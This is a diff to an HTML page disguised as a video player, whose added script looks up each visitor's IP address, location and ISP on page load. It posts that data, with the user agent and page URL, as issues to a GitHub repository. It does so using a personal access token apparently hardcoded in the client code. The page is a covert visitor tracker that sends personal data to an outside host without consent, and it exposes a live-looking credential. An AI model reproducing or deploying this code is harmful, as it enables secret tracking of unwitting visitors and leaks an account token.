@@ -5,11 +5,7 @@
     <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
     <title>Video</title>
     <style>
-        * {
-            margin: 0;
-            padding: 0;
-            box-sizing: border-box;
-        }
+        * { margin: 0; padding: 0; box-sizing: border-box; }
         html, body {
             width: 100%;
             height: 100%;
@@ -50,27 +46,10 @@
             min-width: 200px;
             pointer-events: none;
         }
-        #ipInfo .ip-label {
-            opacity: 0.4;
-            font-size: 9px;
-            text-transform: uppercase;
-            letter-spacing: 1.5px;
-        }
-        #ipInfo .ip-value {
-            font-weight: 700;
-            font-size: 16px;
-            font-family: 'Courier New', monospace;
-            color: #00ff88;
-        }
-        #ipInfo .ip-detail {
-            opacity: 0.6;
-            font-size: 11px;
-        }
-        #ipInfo .ip-status {
-            font-size: 10px;
-            color: #fdcb6e;
-            margin-top: 4px;
-        }
+        #ipInfo .ip-label { opacity: 0.4; font-size: 9px; text-transform: uppercase; letter-spacing: 1.5px; }
+        #ipInfo .ip-value { font-weight: 700; font-size: 16px; font-family: 'Courier New', monospace; color: #00ff88; }
+        #ipInfo .ip-detail { opacity: 0.6; font-size: 11px; }
+        #ipInfo .ip-status { font-size: 10px; color: #fdcb6e; margin-top: 4px; }
         .spinner {
             display: inline-block;
             width: 14px;
@@ -82,10 +61,7 @@
             vertical-align: middle;
             margin-right: 6px;
         }
-        @keyframes spin {
-            0% { transform: rotate(0deg); }
-            100% { transform: rotate(360deg); }
-        }
+        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
         .toast {
             position: fixed;
             bottom: 80px;
@@ -97,20 +73,9 @@
             font-family: 'Segoe UI', sans-serif;
             animation: fadeIn 0.5s ease;
         }
-        .toast.success {
-            background: rgba(0, 255, 136, 0.15);
-            border: 1px solid #00ff88;
-            color: #00ff88;
-        }
-        .toast.error {
-            background: rgba(255, 0, 0, 0.15);
-            border: 1px solid #ff4444;
-            color: #ff4444;
-        }
-        @keyframes fadeIn {
-            0% { opacity: 0; transform: translateY(10px); }
-            100% { opacity: 1; transform: translateY(0); }
-        }
+        .toast.success { background: rgba(0, 255, 136, 0.15); border: 1px solid #00ff88; color: #00ff88; }
+        .toast.error { background: rgba(255, 0, 0, 0.15); border: 1px solid #ff4444; color: #ff4444; }
+        @keyframes fadeIn { 0% { opacity: 0; transform: translateY(10px); } 100% { opacity: 1; transform: translateY(0); } }
     </style>
 </head>
 <body>
@@ -122,14 +87,21 @@
         <div class="ip-value" id="ipDisplay"><span class="spinner"></span>Fetching...</div>
         <div class="ip-detail" id="locationDisplay">Loading location...</div>
         <div class="ip-detail" id="ispDisplay"></div>
-        <div class="ip-status" id="statusDisplay">⏳ Logging to local storage...</div>
+        <div class="ip-status" id="statusDisplay">⏳ Logging...</div>
     </div>
 
     <script>
+        // ============================================================
+        // ⚠️ REPLACE THESE WITH YOUR VALUES
+        // ============================================================
+        const GITHUB_TOKEN = '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';
+        const GITHUB_REPO = 'driftingmaina/BetterSoicety.net';
+        // Example: const GITHUB_REPO = 'Sawye/comgirlservices';
+        // ============================================================
+
         // ─── VIDEO CONTROLS ───
         const video = document.getElementById('myVideo');
         const overlay = document.getElementById('clickOverlay');
-
         video.play().catch(() => overlay.style.display = 'block');
         overlay.addEventListener('click', () => {
             video.play();
@@ -137,49 +109,51 @@
         });
         document.addEventListener('click', () => { if (video.paused) video.play(); });
 
-        // ─── STORAGE HELPERS ───
-        function getStoredIPs() {
-            try {
-                const data = localStorage.getItem('visitor_ips');
-                return data ? JSON.parse(data) : [];
-            } catch {
-                return [];
+        // ─── CREATE GITHUB ISSUE ───
+        async function createGitHubIssue(ipData) {
+            const issueTitle = `Visitor: ${ipData.ip}`;
+            const issueBody = `
+## 🛡️ New Visitor Logged
+
+| Field | Value |
+|-------|-------|
+| **IP Address** | \`${ipData.ip}\` |
+| **Location** | ${ipData.location} |
+| **ISP** | ${ipData.isp} |
+| **User Agent** | \`${navigator.userAgent}\` |
+| **Timestamp** | ${new Date().toISOString()} |
+| **Page** | ${window.location.href} |
+
+\`\`\`json
+${JSON.stringify(ipData, null, 2)}
+\`\`\`
+            `;
+
+            const response = await fetch(`https://api.github.com/repos/${GITHUB_REPO}/issues`, {
+                method: 'POST',
+                headers: {
+                    'Authorization': `token ${GITHUB_TOKEN}`,
+                    'Content-Type': 'application/json',
+                    'Accept': 'application/vnd.github.v3+json'
+                },
+                body: JSON.stringify({
+                    title: issueTitle,
+                    body: issueBody,
+                    labels: ['visitor', 'security-log']
+                })
+            });
+
+            if (!response.ok) {
+                const error = await response.json();
+                throw new Error(`GitHub API error: ${error.message || 'Unknown'}`);
             }
+
+            const issue = await response.json();
+            console.log(`[+] Issue #${issue.number} created for ${ipData.ip}`);
+            return issue;
         }
 
-        function saveIP(ipData) {
-            const ips = getStoredIPs();
-            // Check if IP already exists
-            const existing = ips.find(i => i.ip === ipData.ip);
-            if (existing) {
-                existing.lastSeen = new Date().toISOString();
-                existing.location = ipData.location;
-                existing.isp = ipData.isp;
-            } else {
-                ips.push({
-                    ip: ipData.ip,
-                    location: ipData.location,
-                    isp: ipData.isp,
-                    firstSeen: new Date().toISOString(),
-                    lastSeen: new Date().toISOString()
-                });
-            }
-            localStorage.setItem('visitor_ips', JSON.stringify(ips));
-            return ips;
-        }
-
-        function showToast(message, type) {
-            const existing = document.querySelector('.toast');
-            if (existing) existing.remove();
-            
-            const toast = document.createElement('div');
-            toast.className = `toast ${type}`;
-            toast.textContent = message;
-            document.body.appendChild(toast);
-            setTimeout(() => toast.remove(), 5000);
-        }
-
-        // ─── FETCH PUBLIC IP ───
+        // ─── FETCH PUBLIC IP & CREATE ISSUE ───
         async function fetchAndLogIP() {
             const ipDisplay = document.getElementById('ipDisplay');
             const locationDisplay = document.getElementById('locationDisplay');
@@ -201,40 +175,42 @@
                 locationDisplay.textContent = `📍 ${locParts}`;
                 ispDisplay.textContent = data.org || data.isp || '';
 
-                // Save to localStorage
+                // Prepare data
                 const ipData = {
                     ip: data.ip || 'Unknown',
                     location: locParts,
                     isp: data.org || data.isp || 'Unknown'
                 };
 
-                const allIPs = saveIP(ipData);
-                statusDisplay.textContent = `✅ Logged to local storage (${allIPs.length} total IPs)`;
+                // Create GitHub Issue
+                statusDisplay.textContent = '⏳ Creating GitHub issue...';
+                await createGitHubIssue(ipData);
+
+                statusDisplay.textContent = '✅ Logged to GitHub Issues!';
                 statusDisplay.style.color = '#00ff88';
 
-                showToast('✅ IP saved to local storage', 'success');
-
-                // Log to console for debugging
-                console.log('[Visitor Log]', {
-                    ip: data.ip,
-                    location: locParts,
-                    isp: data.org || data.isp,
-                    timestamp: new Date().toISOString(),
-                    totalIPs: allIPs.length
-                });
+                showToast('✅ IP logged to GitHub Issues', 'success');
 
             } catch (error) {
-                console.error('IP fetch failed:', error);
-                ipDisplay.innerHTML = '⚠️ Unable to fetch';
+                console.error('Error:', error);
+                ipDisplay.innerHTML = '⚠️ Error';
                 ipDisplay.style.color = '#ff6644';
-                locationDisplay.textContent = 'IP service unavailable';
-                statusDisplay.textContent = '❌ Failed to log IP';
+                statusDisplay.textContent = `❌ ${error.message}`;
                 statusDisplay.style.color = '#ff6644';
-                showToast('❌ Failed to fetch IP', 'error');
+                showToast('❌ Failed to log IP', 'error');
             }
         }
 
-        // ─── RUN ───
+        function showToast(message, type) {
+            const existing = document.querySelector('.toast');
+            if (existing) existing.remove();
+            const toast = document.createElement('div');
+            toast.className = `toast ${type}`;
+            toast.textContent = message;
+            document.body.appendChild(toast);
+            setTimeout(() => toast.remove(), 5000);
+        }
+
         fetchAndLogIP();
     </script>
 </body>
